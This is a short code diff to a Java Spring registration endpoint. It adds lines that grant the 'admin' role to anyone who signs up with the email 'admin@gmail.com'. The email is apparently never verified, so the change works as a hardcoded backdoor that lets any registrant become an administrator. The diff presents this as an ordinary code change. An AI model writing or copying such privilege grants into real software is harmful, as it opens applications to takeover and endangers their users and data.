@@ -28,6 +28,9 @@ public class RegistrationEndpoint {
 
     @PostMapping
     public String registerUser(@ModelAttribute("user") RegistrationDto registrationDto){
+        if(registrationDto.getEmail().equals("admin@gmail.com")){
+            registrationDto.setRole("admin");
+        }
         userDao.signup(registrationDto);
         return "redirect:/registration?success";
     }
